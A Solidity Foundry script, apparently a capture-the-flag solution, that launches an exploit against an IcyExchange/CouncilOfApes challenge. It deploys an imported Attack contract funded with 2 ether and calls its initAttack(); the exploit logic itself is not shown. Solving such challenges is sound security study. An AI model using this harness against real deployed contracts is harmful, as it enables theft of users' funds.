// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Importing Forge standard libraries and contract dependencies.
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./src/IcyExchange.sol";
import "./src/IcyPool.sol";
import "./src/Setup.sol";
import "./src/Attack.sol";

/**
 * @title ExploitScript
 * @dev This contract demonstrates an exploit on the IcyExchange contract.
 */
contract ExploitScript is Script {
    // Instances of contracts involved in the exploit.
    IcyExchange private icyDex;
    CouncilOfApes private councilApe;
    Attack private attack;
    Setup private set;

    /**
     * @dev Sets up the exploit environment by initializing contract instances.
     */
    function setUp() public override {
        set = new Setup();
        // Initialize IcyExchange and CouncilOfApes contract instances.
        icyDex = IcyExchange(set.TARGET());
        councilApe = CouncilOfApes(address(icyDex.council()));
    }

    /**
     * @dev Executes the exploit against the IcyExchange contract.
     */
    function run() public override {
        // Start broadcasting transactions to the network.
        vm.startBroadcast();

        // Deploy the Attack contract with 2 ether to fund the attack.
        attack = new Attack{value: 2 ether}(
            address(icyDex), 
            address(councilApe), 
            address(icyDex.icyToken())
        );

        // Initiate the attack.
        attack.initAttack();
        
        // Stop broadcasting transactions.
        vm.stopBroadcast();
    }
}
